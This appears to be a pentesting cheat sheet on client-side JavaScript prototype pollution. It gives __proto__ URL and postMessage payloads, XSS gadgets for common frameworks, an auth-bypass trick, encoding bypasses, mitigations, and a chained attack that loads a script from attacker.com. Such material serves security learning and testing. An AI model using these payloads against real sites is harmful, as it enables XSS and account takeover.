---
tags:
  - medium
  - client-side
---

# Client-Side Prototype Pollution

Inject properties into JavaScript object prototypes to modify application behavior or achieve XSS.

## TL;DR

```javascript
// URL-based pollution
https://target.com/?__proto__[isAdmin]=true

// Verify in console
console.log({}.isAdmin);  // "true" if vulnerable
```

## How It Works

JavaScript objects inherit from `Object.prototype`. If attacker controls property assignment:

```javascript
obj['__proto__']['polluted'] = true;
// Now: {}.polluted === true (all objects affected)
```

## Detection

### URL Parameter Testing

```
https://target.com/?__proto__[test]=polluted
https://target.com/?__proto__.test=polluted
https://target.com/?constructor[prototype][test]=polluted
```

**Verify:**
```javascript
console.log({}.test);  // "polluted" if vulnerable
console.log(Object.prototype.test);
```

### Find Gadgets

Look for code that accesses potentially polluted properties:

```javascript
element.innerHTML = config.template || '';  // template pollutable
eval(settings.code);
location = options.redirect;
```

## Exploitation

### URL Parameter Pollution

**Query string:**
```
?__proto__[property]=value
?__proto__.property=value
?constructor.prototype.property=value
```

**Hash fragment:**
```
#__proto__[property]=value
```

### postMessage Pollution

```html
<iframe src="https://vulnerable.com" id="target"></iframe>
<script>
  target.onload = () => {
    target.contentWindow.postMessage(
      '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
      '*'
    );
  };
</script>
```

### DOM XSS via Prototype Pollution

**innerHTML gadget:**
```javascript
// Application code
element.innerHTML = config.welcomeMessage || 'Hello';

// Pollution payload
?__proto__[welcomeMessage]=<img src=x onerror=alert(1)>
```

**jQuery gadget:**
```javascript
// Application: $(config.selector).html(data);
// Pollution:
?__proto__[selector]=body&__proto__[html]=<script>alert(1)</script>
```

### Auth Bypass

```javascript
// Application code
if (user.isAdmin) { showAdminPanel(); }

// If user object checks prototype chain:
?__proto__[isAdmin]=true
```

### Framework-Specific

**AngularJS:**
```
?__proto__[template]={{constructor.constructor('alert(1)')()}}
```

**Vue.js:**
```
?__proto__[v-html]=<script>alert(1)</script>
```

## Bypasses

### Alternative Paths

```
?constructor[prototype][polluted]=true
?__proto__.constructor.prototype.polluted=true
```

### Encoding

```
?__proto__%5Bprop%5D=value
?%5F%5Fproto%5F%5F[prop]=value
```

## Gadget Hunting

### Common Libraries

**Lodash (< 4.17.12):**
```javascript
_.merge({}, JSON.parse('{"__proto__":{"polluted":true}}'));
```

**jQuery:**
```javascript
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":true}}'));
```

### Search Patterns

```javascript
// Vulnerable: no hasOwnProperty check
for (let key in obj) {
  target[key] = obj[key];
}

// Vulnerable: dynamic property access
obj[userInput] = value;

// Gadget: default value patterns
config.prop || defaultValue
```

## Real Examples

| Vulnerability | Impact | Target |
|--------------|--------|--------|
| $.extend pollution | XSS | jQuery |
| _.merge pollution | RCE (server) | Lodash |
| postMessage + merge | XSS | Multiple SPAs |
| URL param pollution | Auth bypass | Various |

**Chained attack:**
```
1. Pollution: ?__proto__[src]=https://attacker.com/xss.js
2. App creates: <script src={config.src}>
3. config.src undefined → falls back to prototype
4. Attacker script loads
```

## Tools

| Tool | Purpose |
|------|---------|
| **Burp DOM Invader** | Automated testing |
| **PPScan** | Prototype pollution scanner |

**Manual Testing:**
```javascript
const params = ['__proto__', 'constructor.prototype'];
const props = ['polluted', 'innerHTML', 'src', 'isAdmin'];

params.forEach(p => {
  props.forEach(prop => {
    console.log(`Test: ?${p}[${prop}]=POLLUTED`);
  });
});
```

## Mitigation Indicators

**Vulnerable:**
```javascript
for (let key in userInput) {
  target[key] = userInput[key];  // No check
}
```

**Protected:**
```javascript
Object.freeze(Object.prototype);
// Or hasOwnProperty check
if (obj.hasOwnProperty(key)) { ... }
// Or null prototype
let config = Object.create(null);
```
